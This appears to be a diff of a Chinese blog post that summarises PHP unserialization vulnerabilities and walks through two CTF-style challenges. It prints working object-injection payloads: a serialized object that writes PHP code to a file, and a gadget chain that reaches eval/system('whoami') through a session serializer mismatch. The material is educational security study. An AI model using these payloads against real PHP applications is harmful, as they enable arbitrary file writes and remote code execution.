class="string">'O:4:"test":2:&#123;s:1:"a";N;s:1:"b";s:6:"hellob";&#125;'</span> ;</div><div class="line">        $e = <span class="string">'O:5:"test1":2:&#123;s:1:"a";s:5:"hello";s:1:"b";N;&#125;'</span> ;</div><div class="line">    </div><div class="line">        var_dump(unserialize($d));</div><div class="line">        var_dump(unserialize($e));</div></pre></td></tr></table></figure>
+<p>运行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">a has changed</div><div class="line">object(test)[<span class="number">1</span>]</div><div class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hia'</span> (length=<span class="number">3</span>)</div><div class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hellob'</span> (length=<span class="number">6</span>)</div><div class="line">a has changed</div><div class="line">object(test1)[<span class="number">1</span>]</div><div class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hia'</span> (length=<span class="number">3</span>)</div><div class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; <span class="keyword">null</span></div></pre></td></tr></table></figure></p>
+<h2 id="0x02-PHP序列化的利用"><a href="#0x02-PHP序列化的利用" class="headerlink" title="0x02 PHP序列化的利用"></a>0x02 PHP序列化的利用</h2><h3 id="1、magic函数和序列化"><a href="#1、magic函数和序列化" class="headerlink" title="1、magic函数和序列化"></a>1、magic函数和序列化</h3><p><strong>参考</strong>：<a href="http://wps2015.org/drops/drops/%E7%90%86%E8%A7%A3php%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5.html" target="_blank" rel="external">php对象注入</a><br>除了<strong>sleep()和</strong>wakeup()函数，在序列化时会执行外，还有下面几种利用方式。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">File</span></span></div><div class="line"> &#123;</div><div class="line"> 	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($var,$file1,$file2)</span></span>&#123;</div><div class="line"> 		<span class="keyword">$this</span>-&gt;var = $var;</div><div class="line"> 		<span class="keyword">$this</span>-&gt;file1 = $file1;</div><div class="line"> 		<span class="keyword">$this</span>-&gt;file2 = $file2;</div><div class="line"> 		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var.<span class="string">' and '</span>.<span class="keyword">$this</span>-&gt;file1.<span class="string">' and '</span>.<span class="keyword">$this</span>-&gt;file2.<span class="string">'defined'</span>;</div><div class="line"> 	&#125;</div><div class="line"> 	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line"> 		unlink(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/'</span> . <span class="keyword">$this</span>-&gt;file1);</div><div class="line"> 		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file1.<span class="string">'deleted'</span>;</div><div class="line"> 	&#125;</div><div class="line"> 	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line"> 		<span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;file2);</div><div class="line"></div><div class="line"> 	&#125;</div><div class="line"></div><div class="line"></div><div class="line"> &#125;</div><div class="line"></div><div class="line"><span class="comment">// $file = new File('hello','123.txt','456.php');</span></div><div class="line"><span class="comment">// var_dump(serialize($file));</span></div><div class="line"><span class="keyword">echo</span> unserialize(<span class="string">'O:4:"File":3:&#123;s:3:"var";s:5:"hello";s:5:"file1";s:7:"123.txt";s:5:"file2";s:7:"456.php";&#125;'</span>);</div></pre></td></tr></table></figure></p>
+<p>（<strong>construct()函数，在实例化一个对象时被调用，一般用来给属性赋值，</strong>destruct()在实例化对象完成后执行，__toString()函数在echo一个对象时被调用）</p>
 <p><strong>construct()函数内定义了三个变量，var这个没什么暖用，file1和file2，我们在序列化字符串中定义为已经服务器上已经存在的两个文件123.txt和456.php，</strong>destruct()中有一个unlink方法，是删除file1，__toString()中，读取file2的内容。</p>
-<p>执行结果：</p>
-<pre><code>123.txtdeleted
-</code></pre><p>查看源码:</p>
-<pre><code>&lt;?php  echo 123; ?&gt;123.txtdeleted
-</code></pre><p>将字符串反序列化后，由于已经对变量赋过值，那么就不会再执行<strong>construct()函数，在</strong>construct()中赋值的变量也是无效的。上述代码中<strong>destruct()方法在在反序列化后，实例化对象结束后执行了，</strong>tostring()函数在echo unserialize()处，也被执行了<br>如果说在当前页面中有request系列函数，那么就可以造成php对象注入：<br><a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">http://drops.wooyun.org/papers/4820</a></p>
-<p><strong>2、三个白帽挑战赛第三期</strong></p>
-<p>是一道源码审计题，题目大致是sql注入结合序列化写入文件<br>部分源码（由于我没有做过题，所以我只截取了和序列化漏洞相关的部分源码）：</p>
-<pre><code>class Cache extends \ArrayObject
-{
-    public $path;
-    function __construct($path)
-    {
-        parent::__construct([],\ArrayObject::STD_PROP_LIST | \ArrayObject::ARRAY_AS_PROPS);
-        $this-&gt;path = $path;
-        if(file_exists($path)){
-            $this-&gt;cache = unserialize(file_get_contents($this-&gt;path));
-        }
-    function offset(){
-    //一些没暖用的代码
-    }
-
-    }
-
-    function __destruct()
-    {
-        $cache = $this-&gt;serialize();
-        file_put_contents($this-&gt;path, $cache);
-
-    }
-
-}
-</code></pre><p>模拟了这样一个页面去实例化:</p>
-<pre><code>include(&apos;cache.php&apos;);
-$cache = new Cache(&apos;path.txt&apos;);
-</code></pre><p>通过SQL注入，可控一个文件，假设可控的是path.txt这个文件（在实际的题目中，SQL注入权限不够，web目录下不可写文件，但其他目录可写，已知目录下有文件md5(username).txt，文件名知道，内容可控），这段代码的意思是，判断该文件存在后，读取文件内容，并且反序列化内容，结束时再经过序列化存进文件中。所以可以在可控文件中构造序列化字符串，改变当前的path属性为我们想要的目录。</p>
-<p>path.txt:</p>
-<pre><code>C:5:&quot;Cache&quot;:103:{x:i:3;a:0:{};m:a:2:{s:4:&quot;path&quot;;s:25:&quot;F:\wamp\www\test\path.php&quot;;s:5:&quot;cache&quot;;s:18:&quot;&lt;?php echo 123; ?&gt;&quot;;}}
-</code></pre><p>上述字符串是通过输出serialize(一个实例化的Cache对象)构造的,当__construct()执行时，就会将上述字符串反序列化，此时已经实例化了一个cache对象，而它的path值变成了我们定义的”F:\wamp\www\test\path.php”，并且多了一个cache属性，值为<code>&lt;?php echo 123; ?&gt;</code>，这里的属性名cache是可以随意取的，但如果源码中：</p>
-<pre><code>$cache = $this-&gt;serialize();
-</code></pre><p>变成了：</p>
-<pre><code>$cache = serialize($this-&gt;cache);
-</code></pre><p>那么path.txt中的<code>&quot;cache&quot;;s:18:&quot;&lt;?php echo 123; ?&gt;&quot;</code>;属性名就必须和源码serialize($this-&gt;cache)当中的属性名相同。</p>
+<p>执行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">123.</span>txtdeleted</div></pre></td></tr></table></figure></p>
+<p>查看源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  <span class="keyword">echo</span> <span class="number">123</span>; <span class="meta">?&gt;</span><span class="number">123.</span>txtdeleted</div></pre></td></tr></table></figure></p>
+<p>将字符串反序列化后，由于已经对变量赋过值，那么就不会再执行<strong>construct()函数，在</strong>construct()中赋值的变量也是无效的。上述代码中<strong>destruct()方法在在反序列化后，实例化对象结束后执行了，</strong>tostring()函数在echo unserialize()处，也被执行了<br>如果说在当前页面中有request系列函数，那么就可以造成php对象注入：<br><a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">http://drops.wooyun.org/papers/4820</a></p>
+<h3 id="2、三个白帽挑战赛第三期"><a href="#2、三个白帽挑战赛第三期" class="headerlink" title="2、三个白帽挑战赛第三期"></a>2、三个白帽挑战赛第三期</h3><p>是一道源码审计题，题目大致是sql注入结合序列化写入文件<br>部分源码也是在某个大神<a href="http://www.math1as.com/" target="_blank" rel="external">博客</a>看到的（由于我没有做过题，所以我只截取了和序列化漏洞相关的部分源码）：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span> <span class="keyword">extends</span> \<span class="title">ArrayObject</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">public</span> $path;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span></span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">parent</span>::__construct([],\ArrayObject::STD_PROP_LIST | \ArrayObject::ARRAY_AS_PROPS);</div><div class="line">		<span class="keyword">$this</span>-&gt;path = $path;</div><div class="line">		<span class="keyword">if</span>(file_exists($path))&#123;</div><div class="line">			<span class="keyword">$this</span>-&gt;cache = unserialize(file_get_contents(<span class="keyword">$this</span>-&gt;path));</div><div class="line">		&#125;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">offset</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="comment">//一些不知道干嘛用的代码</span></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line">	&#123;</div><div class="line">		$cache = <span class="keyword">$this</span>-&gt;serialize();</div><div class="line">		file_put_contents(<span class="keyword">$this</span>-&gt;path, $cache);</div><div class="line">		</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>又由于我没有做过题。。。。所以模拟了这样一个页面去实例化:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">include</span>(<span class="string">'cache.php'</span>);</div><div class="line">$cache = <span class="keyword">new</span> Cache(<span class="string">'path.txt'</span>);</div></pre></td></tr></table></figure></p>
+<p>这题好像是这样的：<br>通过SQL注入，可控一个文件，假设可控的是path.txt这个文件（在实际的题目中，SQL注入权限不够，web目录下不可写文件，但其他目录可写，已知目录下有文件md5(username).txt，文件名知道，内容可控），这段代码的意思是，判断该文件存在后，读取文件内容，并且反序列化内容，结束时再经过序列化存进文件中。所以可以在可控文件中构造序列化字符串，改变当前的path属性为我们想要的目录。</p>
+<p>path.txt:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:<span class="number">5</span>:<span class="string">"Cache"</span>:<span class="number">103</span>:&#123;x:i:<span class="number">3</span>;a:<span class="number">0</span>:&#123;&#125;;m:a:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"path"</span>;s:<span class="number">25</span>:<span class="string">"F:\wamp\www\test\path.php"</span>;s:<span class="number">5</span>:<span class="string">"cache"</span>;s:<span class="number">18</span>:<span class="string">"&lt;?php echo 123; ?&gt;"</span>;&#125;&#125;</div></pre></td></tr></table></figure></p>
+<p>上述字符串是通过输出serialize(一个实例化的Cache对象)构造的,当__construct()执行时，就会将上述字符串反序列化，此时已经实例化了一个cache对象，而它的path值变成了我们定义的”F:\wamp\www\test\path.php”，并且多了一个cache属性，值为<code>&lt;?php echo 123; ?&gt;</code>，这里的属性名cache是可以随意取的，但如果源码中：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$cache = <span class="keyword">$this</span>-&gt;serialize();</div></pre></td></tr></table></figure></p>
+<p>变成了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$cache = serialize(<span class="keyword">$this</span>-&gt;cache);</div></pre></td></tr></table></figure></p>
+<p>那么path.txt中的<code>&quot;cache&quot;;s:18:&quot;&lt;?php echo 123; ?&gt;&quot;</code>;属性名就必须和源码serialize($this-&gt;cache)当中的属性名相同。</p>
 <p>所以，现在服务器上其实有两个对象，一个是<code>$cache = new Cache(&#39;path.txt&#39;);</code>定义的$cache，它的path属性值为path.txt;另一个对象是<br><code>C:5:&quot;Cache&quot;:103:{x:i:3;a:0:{};m:a:2:{s:4:&quot;path&quot;;s:25:&quot;F:\wamp\www\test\path.php&quot;;s:5:&quot;cache&quot;;s:18:&quot;&lt;?php echo 123; ?&gt;&quot;;}}</code>被反序列化后的对象，它的path属性的值为path.php。<br>两个对象实例化结束后，会调用其__destruct()方法，将对象自身序列化，写入path属性定义的路径中。这样就将包含<code>&lt;?php echo 123; ?&gt;</code>的内容写进了path.php中。</p>
-<p><strong>3、安恒ctf web3</strong></p>
-<p>一道源码审计题，解题思路是session上传进度，和session序列化处理器漏洞相结合。</p>
-<p> <strong>session上传进度：</strong><br><a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="external">http://php.net/manual/zh/session.upload-progress.php</a><br>当 ==session.upload_progress.enabled== INI 选项开启时，在一个上传处理中，在表单中添加一个与INI中设置的==session.upload_progress.name==同名变量时，$_SESSION中就会添加一个保存上传信息的session值，它的session名是 INI 中定义的==session.upload_progress.prefix==加表单中的post的==session.upload_progress.name==</p>
-<p>测试代码：</p>
-<pre><code>&lt;form action=&quot;&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
- &lt;input type=&quot;hidden&quot; name=&quot;&lt;?php echo ini_get(&quot;session.upload_progress.name&quot;); ?&gt;&quot; value=&quot;123&quot; /&gt;
- &lt;input type=&quot;file&quot; name=&quot;123123&quot; /&gt;
- &lt;input type=&quot;submit&quot; /&gt;
-&lt;/form&gt;
-&lt;?php
- session_start();
- var_dump($_SESSION);
-?&gt;
-</code></pre><p>运行结果：<br><img src="./md2_images/1468567761183.jpg" alt="enter description here" title="1468567761183.jpg"><br>（要查看到上传session，INI貌似要设置这个session.upload_progress.cleanup = Off）</p>
-<p><strong>session序列化处理器:</strong><br><a href="http://drops.wooyun.org/tips/3909" target="_blank" rel="external">http://drops.wooyun.org/tips/3909</a><br>当session.auto_start = 0时：<br>两个脚本注册 Session 会话时使用的序列化处理器（session.serialize_handler）不同，就会出现安全问题。<br>经过测试发现在1.php页面注册session.serialize_handler=‘php_serialize’；<br>在2.php中注册session.serialize_handler=‘php’；<br>那么在1.php中伪造一个格式为：竖线加上对象序列化后的字符串<br>如：==|O:4:”ryat”:1:{s:2:”hi”;s:4:”ryat”;}==<br>那么会按照 php 处理器的反序列化格式读取数据，成功地实例化了该对象。<br>反之，如果是从php-&gt;php_serialize,是不可行的。<br>当session.auto_start = 1时：<br>只能注入 PHP 的内置类</p>
-<p>web3 源码：</p>
-<p>class.php:</p>
-<pre><code>&lt;?php 
-class foo1{
-        public $varr;
-        function __construct(){
-                $this-&gt;varr = &quot;index.php&quot;;
-        }
-        function __destruct(){
-                if(file_exists($this-&gt;varr)){
-                        echo $this-&gt;varr;
-                }
-                echo &quot;这是foo1的析构函数&quot;;
-        }
-}
+<h3 id="3、安恒ctf-web3"><a href="#3、安恒ctf-web3" class="headerlink" title="3、安恒ctf web3"></a>3、安恒ctf web3</h3><p>一道源码审计题，解题思路是session上传进度，和session序列化处理器漏洞相结合。</p>
+<p> <strong>session上传进度：</strong><br><strong>参考</strong>：<a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="external">upload-progress</a><br>当 <code>session.upload_progress.enabled INI</code> 选项开启时，在一个上传处理中，在表单中添加一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，$_SESSION中就会添加一个保存上传信息的session值，它的session名是 INI 中定义的<code>session.upload_progress.prefix</code>加表单中的post的<code>session.upload_progress.name</code></p>
+<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line"> &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"&lt;?php echo ini_get("</span>session.upload_progress.name<span class="string">"); ?&gt;"</span> value=<span class="string">"123"</span> /&gt;</div><div class="line"> &lt;input type=<span class="string">"file"</span> name=<span class="string">"123123"</span> /&gt;</div><div class="line"> &lt;input type=<span class="string">"submit"</span> /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> session_start();</div><div class="line"> var_dump($_SESSION);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>运行结果：<br><img src="https://kovige.github.io/2016/08/17/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/md2_images/1468567761183.jpg" alt="图片说明"><br>（要查看到上传session，INI貌似要设置这个session.upload_progress.cleanup = Off）</p>
+<p><strong>session序列化处理器:</strong><br><strong>参考</strong>：<a href="http://wps2015.org/drops/drops/PHP%20Session%20%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E8%AE%BE%E7%BD%AE%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3.html" target="_blank" rel="external">session序列化</a><br>当session.auto_start = 0时：<br>两个脚本注册 Session 会话时使用的序列化处理器（session.serialize_handler）不同，就会出现安全问题。<br>经过测试发现在1.php页面注册session.serialize_handler=‘php_serialize’；<br>在2.php中注册session.serialize_handler=‘php’；<br>那么在1.php中伪造一个格式为：竖线加上对象序列化后的字符串<br>如：<code>|O:4:&quot;ryat&quot;:1:{s:2:&quot;hi&quot;;s:4:&quot;ryat&quot;;}</code><br>那么会按照 php 处理器的反序列化格式读取数据，成功地实例化了该对象。<br>反之，如果是从php-&gt;php_serialize,是不可行的。<br>当session.auto_start = 1时：<br>只能注入 PHP 的内置类</p>
+<p>web3 源码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">class.php:</div><div class="line"></div><div class="line">    &lt;?php </div><div class="line">    class foo1&#123;</div><div class="line">            public $varr;</div><div class="line">            function __construct()&#123;</div><div class="line">                    $this-&gt;varr = "index.php";</div><div class="line">            &#125;</div><div class="line">            function __destruct()&#123;</div><div class="line">                    if(file_exists($this-&gt;varr))&#123;</div><div class="line">                            echo $this-&gt;varr;</div><div class="line">                    &#125;</div><div class="line">                    echo "这是foo1的析构函数";</div><div class="line">            &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    class foo2&#123;</div><div class="line">            public $varr;</div><div class="line">            public $obj;</div><div class="line">            function __construct()&#123;</div><div class="line">                    $this-&gt;varr = '1234567890';</div><div class="line">                    $this-&gt;obj = null;</div><div class="line">            &#125;</div><div class="line">            function __toString()&#123;</div><div class="line">                    $this-&gt;obj-&gt;execute();</div><div class="line">                    return $this-&gt;varr;</div><div class="line">            &#125;</div><div class="line">            function __desctuct()&#123;</div><div class="line">                    echo "这是foo2的析构函数";</div><div class="line">            &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    class foo3&#123;</div><div class="line">            public $varr;</div><div class="line">            function execute()&#123;</div><div class="line">                    eval($this-&gt;varr);</div><div class="line">            &#125;</div><div class="line">            function __desctuct()&#123;</div><div class="line">                    echo "这是foo3的析构函数";</div><div class="line">            &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    ?&gt;</div></pre></td></tr></table></figure></p>
+<p>index.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    </div><div class="line">    ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</div><div class="line">     </div><div class="line">    <span class="keyword">require</span>(<span class="string">"./sessionTest.php"</span>);</div><div class="line">     </div><div class="line">    session_start();</div><div class="line">    $obj = <span class="keyword">new</span> foo1();</div><div class="line">     </div><div class="line">    $obj-&gt;varr = <span class="string">"phpinfo.php"</span>;</div><div class="line">    </div><div class="line">    <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>想办法让程序执行foo3的excute()函数，就要通过foo2的<strong>toString(),要执行foo2的</strong>toString()就要通过echo foo2，刚好foo1的__deatruct()有段这样的代码<code>echo $this-&gt;varr;</code></p>
+<p>所以这样构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">include</span>(<span class="string">'class.php'</span>);</div><div class="line">$t1 = <span class="keyword">new</span> foo1;</div><div class="line">$t2 = <span class="keyword">new</span> foo2;</div><div class="line">$t3 = <span class="keyword">new</span> foo3;</div><div class="line">$t3-&gt;varr = <span class="string">"system('whoami');"</span>;</div><div class="line">$t2-&gt;obj = $t3;</div><div class="line">$t1-&gt;varr = $t2;</div><div class="line"></div><div class="line">$s1 = serialize($t1);</div><div class="line">var_dump($s1);</div></pre></td></tr></table></figure></p>
+<p>构造出这样一串：<strong>O:4:”foo1”:1:{s:4:”varr”;O:4:”foo2”:2:{s:4:”varr”;s:10:”1234567890”;s:3:”obj”;O:4:”foo3”:1:{s:4:”varr”;s:17:”system(‘whoami’);”;}}}</strong></p>
+<p>所以构造一个表单，向class.php上传文件，通过session上传进度保存的session，来触发session序列化漏洞，由于INI中设置的序列化处理器为php_serialize，而index.php中将其设置为php，就使得伪造的session被成功地实例化了。<br>有两类不同的插法~<br>1、将序列化字符串插入PHP_SESSION_UPLOAD_PROGRESS<br>session名变成了PHP_SESSION_UPLOAD_PROGRESS_123,|后面的payload会替换整个session值<br><img src="https://kovige.github.io/2016/08/17/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/md2_images/1468571622855.jpg" alt="图片说明"></p>
+<p>结果：<br><img src="https://kovige.github.io/2016/08/17/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/md2_images/1468571947277.jpg" alt="图片说明"></p>
+<p>2、将序列化字符串插入post内容中<br>因为session会存上传文件的内容和文件名，所以也可以将序列化字符串插入name、filename.文件上传原本的session值一直到name前面一个参数为止，变成了session名，name参数|后面的payload变成了session值<br><img src="https://kovige.github.io/2016/08/17/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/md2_images/1468572495614.jpg" alt="图片说明"></p>
+<p>结果：<br><img src="https://kovige.github.io/2016/08/17/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/md2_images/1468572538300.jpg" alt="图片说明"></p>
+<p>参考链接：<br><a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">php对象注入</a><br><a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="external">upload-progress</a><br><a href="http://drops.wooyun.org/tips/3909" target="_blank" rel="external">session序列化</a></p>
 
-class foo2{
-        public $varr;
-        public $obj;
-        function __construct(){
-                $this-&gt;varr = &apos;1234567890&apos;;
-                $this-&gt;obj = null;
-        }
-        function __toString(){
-                $this-&gt;obj-&gt;execute();
-                return $this-&gt;varr;
-        }
-        function __desctuct(){
-                echo &quot;这是foo2的析构函数&quot;;
-        }
-}
-
-class foo3{
-        public $varr;
-        function execute(){
-                eval($this-&gt;varr);
-        }
-        function __desctuct(){
-                echo &quot;这是foo3的析构函数&quot;;
-        }
-}
-
-?&gt;
-</code></pre><p>index.php:</p>
-<pre><code>&lt;?php
-
-ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);
-
-require(&quot;./sessionTest.php&quot;);
-
-session_start();
-$obj = new foo1();
-
-$obj-&gt;varr = &quot;phpinfo.php&quot;;
-
-?&gt;
-</code></pre><p>想办法让程序执行foo3的excute()函数，就要通过foo2的<strong>toString(),要执行foo2的</strong>toString()就要通过echo foo2，刚好foo1的__deatruct()有段这样的代码<code>echo $this-&gt;varr;</code></p>
-<p>所以这样构造：</p>
-<pre><code>include(&apos;class.php&apos;);
-$t1 = new foo1;
-$t2 = new foo2;
-$t3 = new foo3;
-$t3-&gt;varr = &quot;system(&apos;whoami&apos;);&quot;;
-$t2-&gt;obj = $t3;
-$t1-&gt;varr = $t2;
-
-$s1 = serialize($t1);
-var_dump($s1);
-</code></pre><p>构造出这样一串：O:4:”foo1”:1:{s:4:”varr”;O:4:”foo2”:2:{s:4:”varr”;s:10:”1234567890”;s:3:”obj”;O:4:”foo3”:1:{s:4:”varr”;s:17:”system(‘whoami’);”;}}}</p>
-<p>所以构造一个表单，向class.php上传文件，通过session上传进度保存的session，来触发session序列化漏洞，由于INI中设置的序列化处理器为php_serialize，而index.php中将其设置为php，就使得伪造的session被成功地实例化了。<br>1、将序列化字符串插入PHP_SESSION_UPLOAD_PROGRESS<br><img src="./md2_images/1468571622855.jpg" alt="enter description here" title="1468571622855.jpg"></p>
-<p>结果：<br><img src="./md2_images/1468571947277.jpg" alt="enter description here" title="1468571947277.jpg"><br>2、将序列化字符串插入post内容中<br>因为session会存文件内容和文件名，所以也可以将序列化字符串插入name、filename<br><img src="./md2_images/1468572495614.jpg" alt="enter description here" title="1468572495614.jpg"><br>结果：<br><img src="./md2_images/1468572538300.jpg" alt="enter description here" title="1468572538300.jpg"></p>
-
-        </div>
-        <footer class="article-footer">
-            
-
-
-
-    <a data-url="https://kovige.github.io/2016/08/17/PHP序列化学习总结/" data-id="cis1je0zb0001q4o8w6kf5ngt" class="article-share-link"><i class="fa fa-share"></i>Share</a>
-<script>
-    (function ($) {
-        $('body').on('click', function() {
-            $('.article-share-box.on').removeClass('on');
-        }).on('click', '.article-share-link', function(e) {
-            e.stopPropagation();
-
-            var $this = $(this),
-                url = $this.attr('data-url'),
-                encodedUrl = encodeURIComponent(url),
-                id = 'article-share-box-' + $this.attr('data-id'),
-                offset = $this.offset(),
-                box;
-
-            if ($('#' + id).length) {
-                box = $('#' + id);
-
-                if (box.hasClass('on')){
-                    box.removeClass('on');
-                    return;
-                }
-            } else {
-                var html = [
-                    '<div id="' + id + '" class="article-share-box">',
-                        '<input class="article-share-input" value="' + url + '">',
-                        '<div class="article-share-links">',
-                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
-                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
-                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
-                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
-                        '</div>',
-                    '</div>'
-                ].join('');
-
-              box = $(html);
-
-              $('body').append(box);
-            }
-
-            $('.article-share-box.on').hide();
-
-            box.css({
-                top: offset.top + 25,
-                left: offset.left
-            }).addClass('on');
-
-        }).on('click', '.article-share-box', function (e) {
-            e.stopPropagation();
-        }).on('click', '.article-share-box-input', function () {
-            $(this).select();
-        }).on('click', '.article-share-box-link', function (e) {
-            e.preventDefault();
-            e.stopPropagation();
-
